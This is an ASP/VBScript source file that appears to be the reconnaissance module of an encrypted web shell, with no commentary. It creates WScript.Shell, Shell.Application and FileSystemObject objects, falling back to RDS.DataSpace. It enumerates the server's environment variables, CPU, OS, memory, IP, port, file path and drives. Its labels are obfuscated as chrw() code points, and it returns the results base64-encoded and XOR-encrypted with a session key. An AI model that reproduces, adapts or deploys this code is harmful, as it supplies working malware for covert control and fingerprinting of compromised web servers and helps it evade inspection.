dim basicInfo,driveList,currentPath,osInfo
currentPath=Server.MapPath(".")
osInfo=request.servervariables("os")

Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+5,1)))
Next
Encrypt=encryptResult
End Function

Function Base64Encode(sText)
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function

Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function
function DriveType(TP)
	select case TP
	Case 0:DriveType=chrw(26410)&chrw(30693)&chrw(30913)&chrw(30424)
	Case 1:DriveType=chrw(31227)&chrw(21160)&chrw(30913)&chrw(30424)
	Case 2:DriveType=chrw(26412)&chrw(22320)&chrw(30913)&chrw(30424)
	Case 3:DriveType=chrw(32593)&chrw(32476)&chrw(20849)&chrw(20139)
	Case 4:DriveType=chrw(20809)&chrw(-25999)
	Case 5:DriveType=chrw(82)&chrw(65)&chrw(77)&chrw(30913)&chrw(30424)
	end select
End function
Function GetFso()
	Dim Fso,Key
	Key="Scripting.FileSystemObject"
	Set Fso=CreateObject(Key)
	if IsEmpty(Fso) then Set Fso=Hfso
	if Not IsEmpty(Fso) then Set GetFso=Fso
	Set Fso=RDS(Key)
	Set GetFso=Fso
End Function
Function GetSize(thesize)
	if thesize>=(1024^3) then GetSize=fix((thesize/(1024^3))*100)/100&"g"
	if thesize>=(1024^2) and thesize<(1024^3) then GetSize=fix((thesize /(1024^2))*100)/100&"m"
	if thesize>=1024 and thesize<(1024^2) then GetSize=fix((thesize/1024)*100)/100&"k"
	if thesize>=0 and thesize<1024 then GetSize=thesize&"b"
End function
sub echo(str)
	'response.Write(str)
	basicInfo=basicInfo&str
end sub
Function RDS(COM)
	Set r=CreateObject("RDS.DataSpace")
	Set RDS=r.CreateObject(COM,"")
End Function
Function GetWS()
	Dim WS,Key
	Key="WScript.Shell"
	Set WS=CreateObject(Key)
	if Not IsEmpty(WS) then Set GetWS=WS
	if IsEmpty(WS) then	Set WS=Hws
	Set WS=RDS(Key)
	Set GetWS=WS
End Function
Function GetSA()
	Dim SA,Key
	Key="shell.application"
	Set SA=CreateObject(Key)
	if IsEmpty(SA) then	Set SA=HSA
	if Not IsEmpty(SA) then Set GetSA=SA
	Set SA=RDS(Key)
	Set GetSA=SA
End Function
Sub main()
		on error resume next
		dim i,ws,Sa,sysenv,envlist,envlists,cpunum,cpuinfo,os
		envlists="SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
		envlist=split(envlists,"$")
		Set ws=GetWS()
		set sysenv=ws.environment("system")
		with request
		cpunum=.servervariables("number_of_processors")
		if isnull(cpunum) or cpunum="" then cpunum=sysenv("number_of_processors")
		os=.servervariables("os")
		if isnull(os) or os="" then	os=sysenv("os")
		cpuinfo=sysenv("processor_identifier")
		osInfo=os
		echo "<style>body,td,th,li,div,table {font-family: SimSun, Helvetica, sans-serif;font-size: 12px;color: #555; line-height:20px}</style><div><font color=red>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(30456)&chrw(20851)&chrw(21442)&chrw(25968)&":</font><hr>"
		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(21517)&":"&.servervariables("server_name")&"</li>"
		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&"ip:"&.servervariables("local_addr")&"</li>"
		echo "<li>"&chrw(26381)&chrw(21153)&chrw(31471)&chrw(21475)&":"&.servervariables("server_port")&"</li>"
		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(20869)&chrw(23384)&":"&GetSize(GetSA().getsysteminformation("physicalmemoryinstalled"))&"</li>"
		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(26102)&chrw(-27148)&":"&now&"</li>"
		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(-28817)&chrw(20214)&":"&.servervariables("server_software")&"</li>"
		echo "<li>"&chrw(-32486)&chrw(26412)&chrw(-29307)&chrw(26102)&chrw(26102)&chrw(-27148)&":"&server.scripttimeout&"</li>"
		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(99)&chrw(112)&chrw(117)&chrw(25968)&chrw(-28209)&":"&cpunum&"</li>"
		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(99)&chrw(112)&chrw(117)&chrw(-29722)&chrw(24773)&":"&cpuinfo&"</li>"
		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(25805)&chrw(20316)&chrw(31995)&chrw(32479)&":"&os&"</li>"
		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(-30237)&chrw(-29743)&chrw(24341)&chrw(25806)&":"&scriptengine&"/"&scriptenginemajorversion&"."&scriptengineminorversion&"."&scriptenginebuildversion&"</li>"
		echo "<li>"&chrw(26412)&chrw(25991)&chrw(20214)&chrw(23454)&chrw(-27067)&chrw(-29201)&chrw(24452)&":"&.servervariables("path_translated")&"</li>"
		end with
		for i=0 to ubound(envlist)
			echo "<li>"&envlist(i)&": "&ws.expandenvironmentstrings("%"&envlist(i)&"%")&"</li>"
		next
		set ws=nothing
		set sysenv=nothing
		Dim TheDrive,Fso
		set Fso=GetFso()
		echo "<hr><font color=red>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(30913)&chrw(30424)&chrw(20449)&chrw(24687)&"</font>:"
		echo "<table><tr><td>"&chrw(30424)&chrw(31526)&"</td><td>"&chrw(31867)&chrw(22411)&"</td><td>"&chrw(21367)&chrw(26631)&"</td><td>"&chrw(25991)&chrw(20214)&chrw(31995)&chrw(32479)&"</td><td>"&chrw(21487)&chrw(29992)&chrw(31354)&chrw(-27148)&"</td><td>"&chrw(24635)&chrw(31354)&chrw(-27148)&"</td></tr>"
		For Each TheDrive In Fso.Drives
			with TheDrive
			driveList=driveList&.DriveLetter&":/;"
			echo "<tr><td>"&.DriveLetter&"</td>"
			echo "<td>"&DriveType(.DriveType)&"</td>"
			If Not UCase(.DriveLetter)="A" Then
				echo "<td>"&.VolumeName&"</td>"
				echo "<td>"&.FileSystem&"</td>"
				echo "<td>"&GetSize(.FreeSpace)&"</td>"
				echo "<td>"&GetSize(.TotalSize)&"</td>"
			End If
			end with
			If Err Then Err.Clear
		Next
		echo "</table><hr><br/></div>"
		Set TheDrive=Nothing
		Set Fso=Nothing
		finalResult=Base64Encode(basicInfo&"<div>driveList:"&driveList&"</div><div>currentPath:"&currentPath&"</div><div>osInfo:"&osInfo&"</div>")
		Response.binarywrite(Encrypt(finalResult))
End Sub
